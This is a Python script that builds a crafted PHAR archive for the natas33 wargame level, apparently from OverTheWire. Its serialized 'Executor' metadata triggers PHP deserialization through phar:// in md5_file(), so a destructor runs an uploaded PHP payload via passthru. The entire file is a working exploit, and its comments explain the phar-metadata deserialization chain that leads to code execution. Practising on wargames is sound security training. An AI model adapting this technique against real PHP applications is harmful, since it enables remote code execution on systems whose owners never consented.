import struct, zlib, hashlib
# natas33 phar builder: a hand-built phar whose METADATA is a serialized
# Executor (filename = /natas33/upload/payload33.php, signature = its md5).
# md5_file()
# on phar:// unserializes the metadata -> our Executor -> __destruct runs
# passthru("php "+filename) with the signature we chose; payload must be
# uploaded into /natas33/upload/ (the .. traversal no longer resolves).
payload = open('/tmp/n33payload.php','rb').read()
md5 = hashlib.md5(payload).hexdigest()
STUB = b"<?php __HALT_COMPILER(); ?>\r\n"
k = b"\x00Executor\x00"
meta  = b'O:8:"Executor":3:{'
fname = b"/natas33/upload/payload33.php"
meta += b's:%d:"%sfilename";s:%d:"%s";' % (len(k+b"filename"), k, len(fname), fname)
meta += b's:%d:"%ssignature";s:32:"%s";' % (len(k+b"signature"), k, md5.encode())
meta += b's:%d:"%sinit";b:0;}' % (len(k+b"init"), k)
m  = struct.pack("<I", 1)                       # file count
m += struct.pack("<H", 0x11)                    # API 1.1
m += struct.pack("<I", 0x10000)                 # global flags (PHAR)
m += struct.pack("<I", 0)                       # alias len
m += struct.pack("<I", len(meta)) + meta        # metadata
m += struct.pack("<I", 1) + b"x"                # file name
m += struct.pack("<I", 1) + struct.pack("<I", 0) + struct.pack("<I", 1)  # size/offset/ctime
m += struct.pack("<I", zlib.crc32(b"x") & 0xFFFFFFFF)
m += struct.pack("<I", 0x1A4) + struct.pack("<I", 0)   # perms + meta len
out = STUB + struct.pack("<I", len(m)) + m + b"x"
out += hashlib.sha1(out).digest() + struct.pack("<I", 2) + b"GBMB"
open('/tmp/n33r2.phar','wb').write(out)
print("payload md5=%s -> /tmp/n33r2.phar (%d bytes)" % (md5, len(out)))

